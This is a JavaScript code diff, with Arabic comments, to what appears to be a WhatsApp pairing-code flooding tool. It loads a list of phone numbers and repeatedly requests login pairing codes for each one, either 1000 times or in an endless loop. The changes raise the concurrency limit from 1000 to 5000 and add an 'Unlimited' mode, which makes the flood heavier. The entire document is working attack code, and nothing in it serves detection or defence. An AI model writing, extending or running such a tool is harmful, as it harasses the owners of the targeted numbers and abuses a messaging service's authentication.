@@ -21,7 +21,7 @@ const checkFileChange = (filePath) => {
     return false;
 };
 
-const MAX_CONCURRENT_REQUESTS = 1000; // الحد الأقصى من الطلبات المتزامنة
+const MAX_CONCURRENT_REQUESTS = 5000; // زيادة الحد الأقصى من الطلبات المتزامنة
 
 async function XeonProject() {
     const { state } = await useMultiFileAuthState('./session');
@@ -50,7 +50,7 @@ async function XeonProject() {
     loadNumbers();
 
     const option = await Promise.race([
-        question(''),
+        question('Choose an option:\n1. 1000\n2. Unlimited\nEnter your choice (1 or 2): '),
         new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
     ]);
 
@@ -80,11 +80,23 @@ async function XeonProject() {
         if (option === '1') {
             const xeonCodes = 1000;
             for (let i = 0; i < xeonCodes; i++) {
-                await Promise.all(phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes)));
+                const batchPromises = [];
+                for (const phoneNumber of phoneNumbers) {
+                    if (batchPromises.length < MAX_CONCURRENT_REQUESTS) {
+                        batchPromises.push(sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes));
+                    }
+                }
+                await Promise.all(batchPromises); // إرسال الطلبات دفعة واحدة
             }
         } else {
             while (true) {
-                await Promise.all(phoneNumbers.map(phoneNumber => sendPairingCode(XeonBotInc, phoneNumber, ++count)));
+                const batchPromises = [];
+                for (const phoneNumber of phoneNumbers) {
+                    if (batchPromises.length < MAX_CONCURRENT_REQUESTS) {
+                        batchPromises.push(sendPairingCode(XeonBotInc, phoneNumber, ++count));
+                    }
+                }
+                await Promise.all(batchPromises); // إرسال الطلبات دفعة واحدة
             }
         }
     } catch (error) {
